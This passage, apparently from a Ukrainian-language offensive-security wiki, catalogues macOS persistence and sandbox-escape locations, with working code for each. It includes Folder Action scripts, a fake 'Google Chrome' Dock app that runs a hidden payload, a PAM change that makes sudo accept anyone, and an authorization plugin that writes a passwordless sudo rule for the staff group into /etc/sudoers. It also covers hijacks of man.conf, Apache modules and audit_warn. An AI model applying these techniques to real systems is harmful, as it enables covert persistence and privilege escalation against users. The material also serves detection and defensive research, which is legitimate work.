Опис: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Опис: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Але вам потрібно мати можливість викликати `osascript` з аргументами для зв'язку з **`System Events`** для налаштування Дій з папками
* Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Має деякі базові дозволи TCC, такі як Робочий стіл, Документи та Завантаження

#### Місцезнаходження

* **`/Library/Scripts/Folder Action Scripts`**
* Потрібні права адміністратора
* **Тригер**: Доступ до вказаної папки
* **`~/Library/Scripts/Folder Action Scripts`**
* **Тригер**: Доступ до вказаної папки

#### Опис та Використання

Дії з папками - це скрипти, які автоматично викликаються змінами у папці, такими як додавання, видалення елементів або інші дії, наприклад відкриття або зміна розміру вікна папки. Ці дії можуть бути використані для різних завдань і можуть бути викликані різними способами, наприклад, за допомогою інтерфейсу Finder або команд терміналу.

Для налаштування Дій з папками у вас є такі варіанти:

1. Створення робочого процесу Дій з папками за допомогою [Automator](https://support.apple.com/guide/automator/welcome/mac) та встановлення його як службу.
2. Прикріплення скрипта вручну через Налаштування Дій з папками у контекстному меню папки.
3. Використання OSAScript для відправлення повідомлень Apple Event до `System Events.app` для програмного налаштування Дій з папками.
* Цей метод особливо корисний для вбудовання дії в систему, що надає рівень стійкості.

Наступний скрипт є прикладом того, що може бути виконано за допомогою Дій з папками:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Щоб зробити вищезазначений скрипт придатним для дій папки, скомпілюйте його за допомогою:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Після компіляції скрипту налаштуйте Дії папки, виконавши наведений нижче скрипт. Цей скрипт увімкне Дії папки глобально і специфічно прикріпить раніше скомпільований скрипт до папки Робочого столу.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Виконайте налаштування скрипта за допомогою:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Це спосіб реалізації цієї постійності через GUI:

Це сценарій, який буде виконаний:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Скомпілюйте його за допомогою: `osacompile -l JavaScript -o folder.scpt source.js`

Перемістіть його до:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Потім відкрийте програму `Folder Actions Setup`, виберіть **папку, яку ви хочете спостерігати**, і виберіть у вашому випадку **`folder.scpt`** (у моєму випадку я назвав його output2.scp):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Тепер, якщо ви відкриєте цю папку за допомогою **Finder**, ваш скрипт буде виконаний.

Ця конфігурація була збережена в **plist**, розташованому в **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** у форматі base64.

Тепер спробуємо підготувати цю постійність без доступу до GUI:

1. **Скопіюйте `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** в `/tmp`, щоб зробити резервну копію:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Видаліть** Folder Actions, які ви щойно встановили:

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Тепер, коли у нас порожня середовище

3. Скопіюйте резервний файл: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Відкрийте програму Folder Actions Setup.app, щоб використати цю конфігурацію: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
І це не спрацювало для мене, але це інструкції з опису:(
{% endhint %}

### Ярлики Dock

Опис: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Але вам потрібно встановити зловмисну програму всередині системи
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

* `~/Library/Preferences/com.apple.dock.plist`
* **Тригер**: Коли користувач клікає на додаток у доку

#### Опис та Використання

Усі програми, які з'являються в доку, вказані в plist: **`~/Library/Preferences/com.apple.dock.plist`**

Можливо **додати додаток** просто з:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

З використанням деяких **соціально-інженерних** методів ви можете **видаавати себе за, наприклад, Google Chrome** всередині дока та фактично виконувати свій власний скрипт:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Пікери кольорів

Опис: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Корисно для обхідної пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
* Потрібна дуже конкретна дія
* Ви потрапите в іншу пісочницю
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місце

* `/Library/ColorPickers`
* Потрібні права адміністратора
* Тригер: Використання пікера кольорів
* `~/Library/ColorPickers`
* Тригер: Використання пікера кольорів

#### Опис та Використання

**Скомпілюйте пакунок** пікера кольорів з вашим кодом (наприклад, ви можете використати [**цей**](https://github.com/viktorstrate/color-picker-plus)) та додайте конструктор (як у розділі [Заставки](macos-auto-start-locations.md#screen-saver)) і скопіюйте пакунок в `~/Library/ColorPickers`.

Потім, коли пікер кольорів буде активований, ваш код також буде виконаний.

Зверніть увагу, що бінарний файл, який завантажує вашу бібліотеку, має **дуже обмежену пісочницю**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Плагіни Finder Sync

**Опис**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Опис**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Корисно для обхіду пісочниці: **Ні, оскільки потрібно виконати власний додаток**
* Обхід TCC: ???

#### Місцезнаходження

* Конкретний додаток

#### Опис та Використання

Приклад додатку з розширенням Finder Sync можна знайти [**тут**](https://github.com/D00MFist/InSync).

Додатки можуть мати `Розширення Finder Sync`. Це розширення буде вбудовано в додаток, який буде виконаний. Більше того, для того, щоб розширення могло виконати свій код, воно **повинно бути підписане** дійсним сертифікатом розробника Apple, воно повинно бути **пісочницею** (хоча можуть бути додані винятки) та повинно бути зареєстровано з чимось на зразок:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Екранна заставка

Опис: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Опис: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
* Але ви потрапите в звичайну пісочницю додатків
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місце

* `/System/Library/Screen Savers`
* Потрібні права адміністратора
* **Тригер**: Виберіть екранну заставку
* `/Library/Screen Savers`
* Потрібні права адміністратора
* **Тригер**: Виберіть екранну заставку
* `~/Library/Screen Savers`
* **Тригер**: Виберіть екранну заставку

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Опис та Використання

Створіть новий проект у Xcode та виберіть шаблон для створення нової **екранної заставки**. Потім додайте до нього свій код, наприклад, наступний код для генерації журналів.

**Збудуйте** його та скопіюйте пакет `.saver` до **`~/Library/Screen Savers`**. Потім відкрийте GUI екранної заставки та просто клацніть на неї, вона повинна згенерувати багато журналів:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Зверніть увагу, що через entitlements бінарного файлу, який завантажує цей код (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), ви будете **в межах звичайного пісочниця додатків**.
{% endhint %}

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Плагіни Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
* Але ви опинитеся в обмеженій пісочниці додатка
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
* Пісочниця виглядає дуже обмеженою

#### Місцезнаходження

* `~/Library/Spotlight/`
* **Тригер**: Створюється новий файл з розширенням, керованим плагіном Spotlight.
* `/Library/Spotlight/`
* **Тригер**: Створюється новий файл з розширенням, керованим плагіном Spotlight.
* Потрібні права адміністратора
* `/System/Library/Spotlight/`
* **Тригер**: Створюється новий файл з розширенням, керованим плагіном Spotlight.
* Потрібні права адміністратора
* `Some.app/Contents/Library/Spotlight/`
* **Тригер**: Створюється новий файл з розширенням, керованим плагіном Spotlight.
* Потрібен новий додаток

#### Опис та Використання

Spotlight - це вбудована функція пошуку macOS, призначена для забезпечення користувачам **швидкого та всебічного доступу до даних на їх комп'ютерах**.\
Для полегшення цієї швидкості пошуку, Spotlight підтримує **власну базу даних** та створює індекс, **аналізуючи більшість файлів**, що дозволяє швидко шукати як за назвами файлів, так і за їх вмістом.

Основний механізм Spotlight включає центральний процес під назвою 'mds', що означає **'сервер метаданих'**. Цей процес керує всім сервісом Spotlight. Доповнюючи це, є кілька демонів 'mdworker', які виконують різноманітні завдання обслуговування, такі як індексація різних типів файлів (`ps -ef | grep mdworker`). Ці завдання стають можливими завдяки плагінам імпорту Spotlight або **".mdimporter bundles**", які дозволяють Spotlight розуміти та індексувати вміст у різноманітних форматах файлів.

Плагіни або **`.mdimporter`** bundles розташовані в раніше згаданих місцях, і якщо з'являється новий пакет, він завантажується протягом хвилини (не потрібно перезапускати жодний сервіс). Ці пакети повинні вказувати, які **типи файлів та розширення вони можуть керувати**, таким чином, Spotlight використовуватиме їх, коли створюється новий файл з вказаним розширенням.

Можливо **знайти всі `mdimporters`**, які завантажені, запустивши:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
І, наприклад, **/Library/Spotlight/iBooksAuthor.mdimporter** використовується для аналізу цих типів файлів (розширення `.iba` та `.book` серед інших):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Якщо ви перевіряєте Plist іншого `mdimporter`, ви, можливо, не знайдете запис **`UTTypeConformsTo`**. Це тому, що це вбудований _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) і не потребує вказувати розширення.

Більше того, системні стандартні плагіни завжди мають пріоритет, тому зловмисник може отримати доступ лише до файлів, які не індексуються іншими `mdimporters` Apple.
{% endhint %}

Для створення власного імпортера ви можете почати з цього проекту: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) і потім змінити назву, **`CFBundleDocumentTypes`** та додати **`UTImportedTypeDeclarations`**, щоб підтримувати розширення, які ви хочете підтримати, і відобразити їх у **`schema.xml`**.\
Потім **змініть** код функції **`GetMetadataForFile`**, щоб виконати вашу вразливість, коли створюється файл з обробленим розширенням.

Нарешті **збудуйте та скопіюйте свій новий `.mdimporter`** до одного з попередніх місць, і ви можете перевірити, коли він завантажується, **моніторинг логів** або перевіряючи **`mdimport -L.`**

### ~~Preference Pane~~

{% hint style="danger" %}
Здається, що це більше не працює.
{% endhint %}

Опис: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
* Потрібна конкретна дія користувача
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місце

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Опис

Здається, що це більше не працює.

## Обхід кореневої пісочниці

{% hint style="success" %}
Тут ви знайдете початкові місця, корисні для **обходу пісочниці**, які дозволяють просто виконати щось, **записавши це в файл**, бути **root** та/або потребувати інших **дивних умов.**
{% endhint %}

### Періодичний

Опис: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
* Але вам потрібно бути root
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місце

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Потрібен root
* **Тригер**: Коли настане час
* `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local`
* Потрібен root
* **Тригер**: Коли настане час

#### Опис та Використання

Періодичні скрипти (**`/etc/periodic`**) виконуються через налаштовані **демони запуску** в `/System/Library/LaunchDaemons/com.apple.periodic*`. Зверніть увагу, що скрипти, збережені в `/etc/periodic/`, виконуються як **власник файлу**, тому це не працюватиме для потенційного підвищення привілеїв.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Існують інші періодичні скрипти, які будуть виконані, вказані в **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Якщо ви зможете записати будь-який з файлів `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local`, він буде **виконаний раніше чи пізніше**.

{% hint style="warning" %}
Зверніть увагу, що періодичний скрипт буде **виконаний як власник скрипта**. Таким чином, якщо звичайний користувач є власником скрипта, він буде виконаний як цей користувач (це може запобігти атакам на підвищення привілеїв).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
* Але вам потрібно бути root
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

* Завжди потрібен root

#### Опис та експлуатація

Оскільки PAM більше спрямований на **постійність** та шкідливе програмне забезпечення, ніж на просте виконання в macOS, цей блог не надасть детального пояснення, **прочитайте описи, щоб краще зрозуміти цю техніку**.

Перевірте модулі PAM за допомогою:
```bash
ls -l /etc/pam.d
```
Техніка збереження/підвищення привілеїв, яка використовує PAM, полягає в тому, що модифікуємо модуль /etc/pam.d/sudo, додаючи на початку рядок:
```bash
auth       sufficient     pam_permit.so
```
Так це буде **виглядати** приблизно так:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Тому будь-яка спроба використання **`sudo` буде працювати**.

{% hint style="danger" %}
Зверніть увагу, що цей каталог захищений TCC, тому дуже ймовірно, що користувач отримає запит на доступ.
{% endhint %}

### Плагіни авторизації

Опис: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Опис: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
* Але вам потрібно бути root та робити додаткові налаштування
* Обхід TCC: ???

#### Місцезнаходження

* `/Library/Security/SecurityAgentPlugins/`
* Потрібні права root
* Також потрібно налаштувати базу даних авторизації для використання плагіна

#### Опис та Використання

Ви можете створити плагін авторизації, який буде виконуватися при вході користувача для збереження постійності. Для отримання додаткової інформації про створення одного з цих плагінів перегляньте попередні описи (і будьте обережні, погано написаний плагін може заблокувати вас, і вам доведеться очистити свій Mac у режимі відновлення).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Перемістіть** пакет до місця, з якого він буде завантажений:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Нарешті додайте **правило** для завантаження цього плагіна:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** повідомить фреймворку авторизації, що йому потрібно **викликати зовнішній механізм для авторизації**. Крім того, **`privileged`** зробить його виконуваним користувачем root.

Запустіть його за допомогою:
```bash
security authorize com.asdf.asdf
```
І потім **група персоналу повинна мати доступ sudo** (прочитайте `/etc/sudoers`, щоб підтвердити).

### Man.conf

Опис: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
* Але вам потрібно бути root та користувач повинен використовувати man
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місце

* **`/private/etc/man.conf`**
* Потрібен root
* **`/private/etc/man.conf`**: Кожного разу, коли використовується man

#### Опис та Використання

Файл конфігурації **`/private/etc/man.conf`** вказує на бінарний/скрипт, який використовується при відкритті файлів документації man. Таким чином, шлях до виконавчого файлу можна змінити, щоб кожного разу, коли користувач використовує man для читання документів, виконувалася задній прохід.

Наприклад, встановлено в **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
І потім створіть `/tmp/view` як:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Опис**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
* Але вам потрібно мати права root та запущений apache
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
* Httpd не має entitlements

#### Місце

* **`/etc/apache2/httpd.conf`**
* Потрібні права root
* Тригер: Коли запускається Apache2

#### Опис та Exploit

Ви можете вказати у `/etc/apache2/httpd.conf` завантаження модуля, додавши рядок, наприклад:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Цим чином ваші скомпільовані модулі будуть завантажені Apache. Єдине, що вам потрібно, це **підписати його дійсним сертифікатом Apple**, або вам потрібно **додати новий довірений сертифікат** в систему та **підписати його** ним.

Потім, якщо потрібно, щоб сервер запускався, ви можете виконати:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Приклад коду для Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Каркас аудиту BSM

Опис: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
* Але вам потрібно мати права root, щоб auditd працював і викликав попередження
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місце

* **`/etc/security/audit_warn`**
* Потрібні права root
* **Тригер**: Коли auditd виявляє попередження

#### Опис та Використання

Кожного разу, коли auditd виявляє попередження, сценарій **`/etc/security/audit_warn`** **виконується**. Тому ви можете додати свій вредоносний код до нього.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Ви можете викликати попередження за допомогою `sudo audit -n`.

### Елементи автозапуску

{% hint style="danger" %}
**Це застаріло, тому в цих каталогах не повинно бути нічого.**
{% endhint %}

**StartupItem** - це каталог, який повинен бути розташований у `/Library/StartupItems/` або `/System/Library/StartupItems/`. Після створення цього каталогу в ньому повинні бути два конкретних файли:

1. Сценарій **rc**: сценарій оболонки, який виконується при запуску.
2. Файл **plist**, з назвою `StartupParameters.plist`, який містить різні налаштування конфігурації.

Переконайтеся, що як сценарій rc, так і файл `StartupParameters.plist` правильно розміщені всередині каталогу **StartupItem**, щоб процес завантаження міг їх впізнати та використовувати.

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Я не можу знайти цей компонент у моєму macOS, тому для отримання додаткової інформації перевірте опис
{% endhint %}

Опис: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Представлений Apple, **emond** - це механізм журналювання, який, схоже, є недорозвиненим або, можливо, залишеним без уваги, але залишається доступним. Хоча цей невідомий сервіс не є особливо корисним для адміністратора Mac, він може слугувати як тонкий метод постійності для зловмисників, ймовірно, непомічений більшістю адміністраторів macOS.

Для тих, хто знає про його існування, виявлення будь-якого зловживання **emond** досить просте. LaunchDaemon системи для цієї служби шукає сценарії для виконання у одній папці. Для перевірки цього можна використати наступну команду:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Місце розташування

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Потрібні права адміністратора
* **Спрацьовує**: З XQuartz

#### Опис та Використання

XQuartz **більше не встановлюється в macOS**, тому, якщо вам потрібна більш детальна інформація, перегляньте опис.

### ~~kext~~

{% hint style="danger" %}
